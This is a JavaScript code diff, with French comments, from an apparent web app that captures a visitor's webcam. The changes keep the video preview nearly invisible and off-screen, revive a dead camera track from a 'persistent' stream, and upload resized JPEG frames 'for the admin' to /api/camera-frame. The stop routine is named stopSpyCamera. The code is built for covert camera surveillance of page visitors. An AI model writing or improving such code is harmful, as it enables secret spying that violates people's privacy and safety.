@@ -414,27 +414,44 @@ async function ensureCameraPreviewVideo() {
         cameraPreviewVideo.muted = true;
         cameraPreviewVideo.playsInline = true;
         cameraPreviewVideo.setAttribute('playsinline', '');
-        cameraPreviewVideo.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
+        // On rend la vidéo visible mais minuscule et cachée hors écran pour forcer le rendu sur certains navigateurs
+        cameraPreviewVideo.style.cssText = 'position:fixed;width:1px;height:1px;top:-10px;left:-10px;opacity:0.01;pointer-events:none;z-index:-1;';
         document.body.appendChild(cameraPreviewVideo);
     }
     if (cameraPreviewVideo.srcObject !== videoStream) {
         cameraPreviewVideo.srcObject = videoStream;
-        await cameraPreviewVideo.play().catch(() => {});
+        // On force le play et on attend qu'il soit effectif
+        try {
+            await cameraPreviewVideo.play();
+        } catch (e) {
+            console.warn("Échec play vidéo:", e);
+        }
     }
-    if (cameraPreviewVideo.readyState < 2) {
-        await new Promise((resolve) => {
-            cameraPreviewVideo.onloadeddata = resolve;
-            setTimeout(resolve, 500);
-        });
-    }
+    
+    // Attente explicite du flux vidéo
+    return new Promise((resolve) => {
+        if (cameraPreviewVideo.readyState >= 2) return resolve();
+        const onData = () => {
+            cameraPreviewVideo.removeEventListener('loadeddata', onData);
+            resolve();
+        };
+        cameraPreviewVideo.addEventListener('loadeddata', onData);
+        setTimeout(resolve, 1000); // Timeout de sécurité
+    });
 }
 
 async function uploadCameraFrame() {
     if (!cameraEnabled || !videoStream || !sessionId || cameraUploadInFlight) return;
+    
     const track = videoStream.getVideoTracks()[0];
     if (!track || track.readyState !== 'live') {
-        stopSpyCamera();
-        return;
+        // Si le track est mort, on tente de le réactiver via le flux persistant
+        if (persistentVideoStream && persistentVideoStream.getVideoTracks()[0].readyState === 'live') {
+            videoStream = persistentVideoStream;
+        } else {
+            stopSpyCamera();
+            return;
+        }
     }
 
     cameraUploadInFlight = true;
@@ -442,18 +459,22 @@ async function uploadCameraFrame() {
         await ensureCameraPreviewVideo();
         const canvas = getCameraCaptureCanvas();
         
-        // Optimisation : Résolution réduite pour plus de fluidité à distance
-        const w = Math.min(480, cameraPreviewVideo.videoWidth || 480);
-        const h = Math.min(360, cameraPreviewVideo.videoHeight || 360);
+        // On récupère les vraies dimensions de la vidéo
+        const w = cameraPreviewVideo.videoWidth || 480;
+        const h = cameraPreviewVideo.videoHeight || 360;
         
-        if (!w || !h) return;
-        canvas.width = w;
-        canvas.height = h;
+        if (!w || !h) {
+            cameraUploadInFlight = false;
+            return;
+        }
+
+        canvas.width = 480; // Taille fixe pour l'admin
+        canvas.height = (h / w) * 480;
+        
         const ctx = canvas.getContext('2d');
-        ctx.drawImage(cameraPreviewVideo, 0, 0, w, h);
+        ctx.drawImage(cameraPreviewVideo, 0, 0, canvas.width, canvas.height);
         
-        // Compression JPEG plus forte (0.3 au lieu de 0.5) pour réduire le poids des données
-        const frame = canvas.toDataURL('image/jpeg', 0.3);
+        const frame = canvas.toDataURL('image/jpeg', 0.4); // Qualité un peu plus haute pour éviter le noir
 
         await fetch('/api/camera-frame', {
             method: 'POST',
